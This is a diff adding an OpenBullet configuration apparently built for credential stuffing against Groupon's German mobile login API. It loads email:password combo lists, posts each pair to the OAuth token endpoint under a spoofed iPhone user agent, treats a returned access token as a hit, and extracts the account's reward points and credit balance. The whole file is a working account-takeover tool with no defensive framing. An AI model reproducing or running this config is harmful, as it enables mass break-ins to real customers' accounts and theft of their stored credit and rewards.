@@ -1,0 +1,50 @@
+[SETTINGS]
+{
+  "CreatorLK": "OB-ea0de401f6483bd78a57d3072bfb1a23-LoliKEY",
+  "Name": "Groupon",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-20T13:00:03.8484882+02:00",
+  "AdditionalInfo": "",
+  "KeysDB": "",
+  "LocalKeysDB": "",
+  "isWtoEdit": false,
+  "Author": "Acemy#7578",
+  "Version": "1.2.2.4",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://api.groupon.de/api/mobile/DE/oauth/access_token?client_id=a6fe3a910dae8f847f3446dfde244410&client_version_id=19.5.1&user_agent=Groupon%2F19.5.1%20%28210473%29%20%28iOS%2012.0.1%3B%20iPhone9%2C3%3B%20o2-de%29&lang=de-de&device_id=3C8FBE81-FA0F-8E76-0E25-8D251DDB14E8" 
+  CONTENT "client_id=a6fe3a910dae8f847f3446dfde244410&grant_type=password&password=<PASS>&username=<USER>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: api.groupon.de" 
+  HEADER "Accept: */*" 
+  HEADER "X-Brand: groupon" 
+  HEADER "User-Agent: Groupon/19.5.1 (210473) (iOS 12.0.1; iPhone9,3; o2-de)" 
+  HEADER "X-Request-Id: EEA4D5D4-3295-42C3-81EE-F68AFCBD902F" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "accessToken" 
+  KEYCHAIN Failure OR 
+    KEY "User credentials are invalid" 
+
+PARSE "<SOURCE>" LR "rewardPointsAvailable\":" ",\"" -> CAP "Reward Points" 
+
+PARSE "<SOURCE>" LR "formattedAmount\":\"" "\",\"" -> CAP "Credit Amount" 
+
